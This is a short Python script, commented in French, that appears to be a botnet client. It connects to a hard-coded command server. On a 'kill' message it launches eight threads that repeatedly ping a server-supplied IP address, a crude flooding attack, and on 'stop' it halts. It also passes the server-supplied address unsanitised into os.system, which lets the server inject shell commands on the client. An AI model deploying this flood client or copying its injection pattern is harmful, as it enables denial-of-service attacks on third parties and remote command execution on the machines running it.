import socket
import threading
import os
import time
alive = False

# Thread de ping.
def thread_ping(ip):
	global alive

	while alive:
		os.system("ping -c 5 " + ip)
		time.sleep(1)

# Thread permettant au client de recevoir des messages et commandes du serveur.
def thread_recevoir(client_socket):
	global alive

	while True:
		reponse = client.recv(1024)
		reponse = reponse.decode("utf-8")
		print(reponse)
		if "kill" in reponse and not alive:
			alive = True
			ip = reponse[5:]
			for i in range(8):
				thread_ping1 = threading.Thread(target=thread_ping, args={ip,})
				thread_ping1.start()
		if "stop" in reponse:
			alive = False

# Début du main
serveur_ip = "192.168.0.59"
serveur_port = 9999

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client.connect((serveur_ip, serveur_port))

thread_recevoir = threading.Thread(target=thread_recevoir,args={client,})
thread_recevoir.start()

while True:
	texte = input()
	client.send(str.encode(texte))
